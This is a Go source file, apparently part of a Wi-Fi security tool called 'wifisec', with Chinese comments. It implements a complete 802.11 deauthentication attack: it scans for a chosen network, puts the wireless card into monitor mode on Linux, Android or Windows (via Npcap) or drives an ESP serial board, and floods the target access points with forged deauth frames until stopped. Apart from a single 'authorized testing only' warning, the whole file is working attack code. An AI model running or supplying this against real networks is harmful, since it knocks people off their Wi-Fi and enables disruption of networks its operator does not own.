package functions

import (
	"context"
	"errors"
	"fmt"
	"net"
	"os/signal"
	"strings"
	"syscall"
	"time"
	"wifisec/internal/constants"
	"wifisec/internal/ieee80211"
	platformesp "wifisec/internal/platform/esp"
	platformlinux "wifisec/internal/platform/linux"
	platformwindows "wifisec/internal/platform/windows"
	"wifisec/internal/security"
	"wifisec/internal/utilities"
)

const (
	// sendInterval 是每轮向所有目标发送 deauth 帧后的固定间隔。
	sendInterval = 200 * time.Millisecond
)

// frameWriter 是应用层对帧注入能力的抽象端口。
// Linux/Android 走 AF_PACKET 原始套接字，Windows 走 Npcap wpcap.dll，
// 两者都收敛到这一个接口，注入循环得以跨平台共享。
type frameWriter interface {
	Write([]byte) error
}

// channelSetter 是应用层对信道切换能力的抽象端口。
type channelSetter func(channel int) error

// deauthTarget 是一个待攻击目标的预计算结果：信道 + 帧字节。
type deauthTarget struct {
	channel int
	bssid   string
	frame   []byte
}

// WifiDeauther 对指定 SSID/BSSID 的 AP 持续广播 802.11 deauthentication 帧。
// 用法：wifisec deauth <ssid|bssid> [iface|串口]
//
// EMBEDDED_MODE 为 true 时走 ESP 串口协处理器路径，与宿主机平台无关，
// 也无需 root/管理员权限；为 false 时按平台分发：
// Linux/Termux 走内核 AF_PACKET，Windows 走 Npcap 驱动，
// macOS 系统层面不开放帧注入，只能给出精确的技术说明。
func WifiDeauther(arguments []string) error {
	if constants.EMBEDDED_MODE {
		return deauthESP(arguments)
	}

	switch utilities.GetOS() {
	case utilities.Linux, utilities.Android:
		return deauthLinux(arguments)
	case utilities.Windows:
		return deauthWindows(arguments)
	case utilities.Darwin:
		return deauthDarwin(arguments)
	default:
		return fmt.Errorf("deauth 不支持当前平台：%s", utilities.GetOS())
	}
}

// deauthESP 走 ESP 串口协处理器路径（ESP8266 / ESP32 全系）。
// 射频在板载芯片上，宿主机只发串口命令，因此任何平台、无 root 皆可运行；
// 第二位置参数为串口名，缺省时自动枚举唯一 USB 串口。
// 频段能力以固件握手上报的能力位图为准：多数芯片仅 2.4GHz，
// ESP32-C5 额外支持 5GHz，超出能力的目标逐条跳过并告警。
func deauthESP(arguments []string) error {
	target, targetMAC, portName, err := parseDeauthArgs(arguments)
	if err != nil {
		return err
	}

	if portName == "" {
		portName, err = platformesp.DefaultPort()
		if err != nil {
			return err
		}
	}

	utilities.Info("连接 %s，等待固件就绪（打开串口会复位板子，boot 约需 1-2 秒）…", portName)

	injector, err := platformesp.Open(portName)
	if err != nil {
		return err
	}
	defer injector.Close()

	// 频段提示以固件能力位图为准，而不是宿主机猜测板型。
	band := "2.4GHz"
	if injector.Supports5GHz() {
		band = "2.4/5GHz"
	}
	utilities.Info("协处理器就绪（协议 v%d · %s），通过 %s 扫描周边网络…", injector.FirmwareVersion(), band, portName)

	scanned, err := injector.Scan()
	if err != nil {
		return fmt.Errorf("协处理器扫描失败：%w", err)
	}

	targets := selectESPTargets(scanned, target, targetMAC)
	if len(targets) == 0 {
		if injector.Supports5GHz() {
			return fmt.Errorf("未找到目标 %s，请确认 SSID/BSSID 正确且目标在信号范围内", target)
		}
		return fmt.Errorf("未找到目标 %s；当前协处理器仅支持 2.4GHz，5/6GHz 网络不可见", target)
	}

	deauthTargets := make([]deauthTarget, 0, len(targets))
	for _, ap := range targets {
		// 同名 SSID 可能同时存在 2.4GHz 与 5GHz 的 AP；
		// 超出固件能力的信道逐目标跳过，而不是让整个攻击失败。
		if ap.Channel > 14 && !injector.Supports5GHz() {
			utilities.Warn("目标 %s 位于 5GHz 信道 %d，当前协处理器不支持，已跳过", ap.BSSID, ap.Channel)
			continue
		}

		bssid, err := net.ParseMAC(ap.BSSID)
		if err != nil {
			utilities.Warn("目标 BSSID 格式异常，已跳过：%s", ap.BSSID)
			continue
		}

		frame, err := ieee80211.BuildDeauthFrame(bssid)
		if err != nil {
			utilities.Warn("构造 deauth 帧失败（BSSID %s）：%v", ap.BSSID, err)
			continue
		}

		deauthTargets = append(deauthTargets, deauthTarget{
			channel: ap.Channel,
			bssid:   ap.BSSID,
			frame:   frame,
		})
	}

	if len(deauthTargets) == 0 {
		return errors.New("所有目标的 BSSID 均无法解析，无法发送 deauth 帧")
	}

	ctx, stop := setupSignalHandler()
	defer stop()

	runDeauthLoop(ctx, injector, injector.SetChannel, deauthTargets, portName)

	return nil
}

// selectESPTargets 按 SSID（精确）或 BSSID（小写比较）筛选 ESP 扫描结果。
func selectESPTargets(scanned []platformesp.Network, target string, targetMAC net.HardwareAddr) []platformesp.Network {
	var result []platformesp.Network

	for _, ap := range scanned {
		if targetMAC != nil {
			if strings.EqualFold(ap.BSSID, targetMAC.String()) {
				result = append(result, ap)
			}
			continue
		}

		if ap.SSID == target {
			result = append(result, ap)
		}
	}

	return result
}

// deauthLinux 是 Linux 与 Android(Termux) 的共享 deauth 路径。
// 两者都基于 Linux 内核的 AF_PACKET 原始套接字，差异仅在：
//   - Termux 需要 root（tsu/su）且芯片固件支持 monitor（nexmon 或原生）
//   - Termux 的 iw 可能不在默认 PATH，错误提示需引导安装 root-repo
func deauthLinux(arguments []string) error {
	if err := (security.RootChecker{}).Check(); err != nil {
		return err
	}

	target, targetMAC, ifaceName, err := parseDeauthArgs(arguments)
	if err != nil {
		return err
	}

	// 选定无线接口；未指定时取第一块可用。
	iface, err := selectWirelessInterface(ifaceName)
	if err != nil {
		return err
	}

	if iface.Mode == "managed" && iface.State == "UP" {
		utilities.Warn("接口 %s 当前处于 managed 模式且已连接，进入 monitor 模式将断开当前 Wi-Fi 连接", iface.Name)
	}

	// 扫描并锁定目标 AP。
	scanned, err := platformlinux.Scan(iface.Name)
	if err != nil {
		return fmt.Errorf("扫描失败：%w", err)
	}

	targets := SelectDeauthTargets(scanned, target, targetMAC)
	if len(targets) == 0 {
		return fmt.Errorf("未找到目标 %s，请确认 SSID/BSSID 正确且目标在信号范围内", target)
	}

	deauthTargets := buildDeauthTargets(targets)
	if len(deauthTargets) == 0 {
		return errors.New("所有目标的 BSSID 均无法解析，无法发送 deauth 帧")
	}

	// 准备 monitor 接口：若原接口已是 monitor 模式则直接用，不创建也不删；
	// 否则新建并在退出时删除。
	monitorName, ownMonitor, err := prepareMonitor(iface)
	if err != nil {
		return err
	}
	if ownMonitor {
		defer func() {
			if err := platformlinux.DeleteInterface(monitorName); err != nil {
				utilities.Warn("清理 monitor 接口 %s 失败：%v", monitorName, err)
			}
		}()
	}

	injector, err := platformlinux.OpenInjector(monitorName)
	if err != nil {
		return err
	}
	defer injector.Close()

	ctx, stop := setupSignalHandler()
	defer stop()

	setChannel := func(channel int) error {
		return platformlinux.SetChannel(monitorName, channel)
	}

	runDeauthLoop(ctx, injector, setChannel, deauthTargets, monitorName)

	return nil
}

// deauthWindows 是 Windows 平台的 deauth 路径。
// 依赖 Npcap 驱动（需勾选 "Support raw 802.11 traffic" 安装选项），
// 通过 wpcap.dll 注入帧，通过 WlanHelper.exe 切换 monitor 模式与信道。
// 需要管理员权限；普通用户打开 Npcap 句柄会被驱动拒绝。
func deauthWindows(arguments []string) error {
	if err := (security.AdminChecker{}).Check(); err != nil {
		return err
	}

	target, targetMAC, ifaceName, err := parseDeauthArgs(arguments)
	if err != nil {
		return err
	}

	// 检查 Npcap 是否安装且支持注入。
	if err := platformwindows.CheckNpcap(); err != nil {
		return err
	}

	// 选定无线接口；Windows 需要 GUID 才能构造 Npcap 设备路径。
	iface, err := selectWindowsInterface(ifaceName)
	if err != nil {
		return err
	}

	if iface.GUID == "" {
		return fmt.Errorf("接口 %s 缺少 GUID，无法构造 Npcap 设备路径", iface.Name)
	}

	if iface.State == "UP" {
		utilities.Warn("接口 %s 当前已连接，进入 monitor 模式将断开当前 Wi-Fi 连接", iface.Name)
	}

	// 扫描并锁定目标 AP；netsh 无需管理员即可枚举网络。
	scanned, err := platformwindows.Scan()
	if err != nil {
		return fmt.Errorf("扫描失败：%w", err)
	}

	targets := selectWindowsTargets(scanned, target, targetMAC)
	if len(targets) == 0 {
		return fmt.Errorf("未找到目标 %s，请确认 SSID/BSSID 正确且目标在信号范围内", target)
	}

	// windows.Network 与 linux.Network 在 BSSID/Channel 上语义一致，
	// 直接逐目标构造帧，不跨平台转换类型。
	deauthTargets := make([]deauthTarget, 0, len(targets))
	for _, ap := range targets {
		bssid := net.HardwareAddr(normalizeMAC(ap.BSSID))
		if len(bssid) != 6 {
			utilities.Warn("目标 BSSID 格式异常，已跳过：%s", ap.BSSID)
			continue
		}

		frame, err := ieee80211.BuildDeauthFrame(bssid)
		if err != nil {
			utilities.Warn("构造 deauth 帧失败（BSSID %s）：%v", ap.BSSID, err)
			continue
		}

		deauthTargets = append(deauthTargets, deauthTarget{
			channel: ap.Channel,
			bssid:   normalizeMAC(ap.BSSID),
			frame:   frame,
		})
	}

	if len(deauthTargets) == 0 {
		return errors.New("所有目标的 BSSID 均无法解析，无法发送 deauth 帧")
	}

	// 准备 monitor 模式：若驱动当前已是 monitor 则记录为复用，退出时不动；
	// 否则切换并在退出时恢复 managed。WlanHelper 是 Npcap 自带工具，不引入外部依赖。
	devicePath := platformwindows.NPFDevicePath(iface.GUID)
	monitorWasActive, err := platformwindows.SetMonitorMode(devicePath, true)
	if err != nil {
		return fmt.Errorf("切换 monitor 模式失败：%w", err)
	}
	if !monitorWasActive {
		defer func() {
			if _, err := platformwindows.SetMonitorMode(devicePath, false); err != nil {
				utilities.Warn("恢复 managed 模式失败：%v", err)
			}
		}()
	}

	injector, err := platformwindows.OpenInjector(devicePath)
	if err != nil {
		return err
	}
	defer injector.Close()

	ctx, stop := setupSignalHandler()
	defer stop()

	setChannel := func(channel int) error {
		return platformwindows.SetChannel(devicePath, channel)
	}

	runDeauthLoop(ctx, injector, setChannel, deauthTargets, iface.Name)

	return nil
}

// deauthDarwin 给出 macOS 无法注入的精确技术原因。
// CoreWLAN 只暴露扫描与关联接口，Apple 自 2011 年起移除了所有公开的
// 802.11 帧注入路径；私有框架（Apple80211）在 Catalina 之后也被封存，
// 除非走内核扩展（KEXT，Apple Silicon 上已被 System Extension 取代且
// 依然不允许帧注入），否则 macOS 上不存在合法的 deauth 注入通道。
func deauthDarwin(arguments []string) error {
	return errors.New(
		"macOS 不支持 802.11 帧注入：Apple 未开放任何公共 API，" +
			"CoreWLAN 仅提供扫描与关联；请使用 Linux 或已安装 Npcap 的 Windows")
}

// parseDeauthArgs 解析并校验 deauth 的公共参数：目标（SSID 或 BSSID）与可选接口名。
// 目标是 BSSID 时归一化为小写冒号分隔，否则按 SSID 处理。
func parseDeauthArgs(arguments []string) (target string, targetMAC net.HardwareAddr, ifaceName string, err error) {
	if len(arguments) < 1 || strings.TrimSpace(arguments[0]) == "" {
		err = errors.New("用法：wifisec deauth <ssid|bssid> [iface]，可先用 list 查看周边网络")
		return
	}

	target = strings.TrimSpace(arguments[0])
	if len(arguments) > 1 {
		ifaceName = strings.TrimSpace(arguments[1])
	}

	// 判定目标是 BSSID 还是 SSID；解析失败视为 SSID。
	targetMAC, err = net.ParseMAC(target)
	if err != nil {
		targetMAC = nil
		err = nil
	}

	return target, targetMAC, ifaceName, nil
}

// selectWirelessInterface 按名字选择接口；空名字则取第一块可用。
func selectWirelessInterface(name string) (*WirelessInterface, error) {
	devices, err := FindAllWirelessInterfaces()
	if err != nil {
		return nil, err
	}

	if len(devices) == 0 {
		return nil, errors.New("未发现可用无线接口")
	}

	if name == "" {
		return &devices[0], nil
	}

	for i := range devices {
		if devices[i].Name == name {
			return &devices[i], nil
		}
	}

	return nil, fmt.Errorf("接口 %s 不存在或不是无线接口", name)
}

// selectWindowsInterface 按名字选择接口；空名字则取第一块可用。
// 返回的 Interface 必须带 GUID，否则无法构造 Npcap 设备路径。
func selectWindowsInterface(name string) (*platformwindows.Interface, error) {
	devices, err := platformwindows.DiscoverInterfaces()
	if err != nil {
		return nil, err
	}

	if len(devices) == 0 {
		return nil, errors.New("未发现可用无线接口")
	}

	if name == "" {
		return &devices[0], nil
	}

	for i := range devices {
		if devices[i].Name == name {
			return &devices[i], nil
		}
	}

	return nil, fmt.Errorf("接口 %s 不存在或不是无线接口", name)
}

// SelectDeauthTargets 按 SSID（精确）或 BSSID（归一化后比较）筛选扫描结果。
// 导出供 tests/ 做表驱动测试。
func SelectDeauthTargets(scanned []platformlinux.Network, target string, targetMAC net.HardwareAddr) []platformlinux.Network {
	var result []platformlinux.Network

	for _, ap := range scanned {
		if targetMAC != nil {
			if normalizeMAC(ap.BSSID) == normalizeMAC(targetMAC.String()) {
				result = append(result, ap)
			}
			continue
		}

		if ap.SSID == target {
			result = append(result, ap)
		}
	}

	return result
}

// selectWindowsTargets 按 SSID（精确）或 BSSID（归一化后比较）筛选扫描结果。
// 与 Linux 的 SelectDeauthTargets 逻辑一致，但操作 windows.Network 类型。
func selectWindowsTargets(scanned []platformwindows.Network, target string, targetMAC net.HardwareAddr) []platformwindows.Network {
	var result []platformwindows.Network

	for _, ap := range scanned {
		if targetMAC != nil {
			if normalizeMAC(ap.BSSID) == normalizeMAC(targetMAC.String()) {
				result = append(result, ap)
			}
			continue
		}

		if ap.SSID == target {
			result = append(result, ap)
		}
	}

	return result
}

// buildDeauthTargets 把命中的 AP 列表预生成 deauth 帧并按信道归组，
// 避免每轮循环重复构造；BSSID 无法解析的目标跳过并告警。
func buildDeauthTargets(targets []platformlinux.Network) []deauthTarget {
	deauthTargets := make([]deauthTarget, 0, len(targets))

	for _, ap := range targets {
		bssid := net.HardwareAddr(normalizeMAC(ap.BSSID))
		if len(bssid) != 6 {
			utilities.Warn("目标 BSSID 格式异常，已跳过：%s", ap.BSSID)
			continue
		}

		frame, err := ieee80211.BuildDeauthFrame(bssid)
		if err != nil {
			utilities.Warn("构造 deauth 帧失败（BSSID %s）：%v", ap.BSSID, err)
			continue
		}

		deauthTargets = append(deauthTargets, deauthTarget{
			channel: ap.Channel,
			bssid:   normalizeMAC(ap.BSSID),
			frame:   frame,
		})
	}

	return deauthTargets
}

// prepareMonitor 返回可用的 monitor 接口名与是否为本进程创建。
// 已是 monitor 模式的接口直接复用（own=false）；否则新建（own=true）。
func prepareMonitor(iface *WirelessInterface) (string, bool, error) {
	if iface.Mode == "monitor" {
		return iface.Name, false, nil
	}

	name, err := platformlinux.CreateMonitor(iface.PHY)
	if err != nil {
		return "", false, err
	}

	if err := platformlinux.SetInterfaceUp(name); err != nil {
		// 建口成功但启用失败，回滚删除。
		_ = platformlinux.DeleteInterface(name)
		return "", false, err
	}

	return name, true, nil
}

// runDeauthLoop 是跨平台共享的注入循环：按目标轮发、固定间隔、Ctrl-C 停止。
// setChannel 与 injector 由平台适配层注入，循环本身不感知 AF_PACKET 或 Npcap。
func runDeauthLoop(ctx context.Context, injector frameWriter, setChannel channelSetter, targets []deauthTarget, ifaceName string) {
	utilities.Info("开始 deauth 攻击：接口 %s · 目标 %d 个 · 间隔 %s", ifaceName, len(targets), sendInterval)
	utilities.Warn("仅用于授权测试，请确保目标网络为你所有或已获书面许可")

	started := time.Now()
	sent := 0

	for {
		for _, t := range targets {
			if ctx.Err() != nil {
				break
			}

			if err := setChannel(t.channel); err != nil {
				utilities.Warn("信道 %d 不可用，跳过 %s：%v", t.channel, t.bssid, err)
				continue
			}

			if err := injector.Write(t.frame); err != nil {
				utilities.Warn("发送 deauth 帧失败（%s）：%v", t.bssid, err)
				continue
			}

			sent++
		}

		select {
		case <-ctx.Done():
			fmt.Printf("\r已发送 %d 帧 · 目标 %d 个 · 运行 %s\n", sent, len(targets), time.Since(started).Round(time.Second))
			return
		case <-time.After(sendInterval):
		}
	}
}

// setupSignalHandler 接管 SIGINT/SIGTERM：main 包注册的全局信号处理器会
// 无条件 os.Exit(0)，不 reset 则没有机会清理 monitor 接口与 Npcap 句柄。
func setupSignalHandler() (context.Context, context.CancelFunc) {
	signal.Reset(syscall.SIGINT, syscall.SIGTERM)
	return signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
}
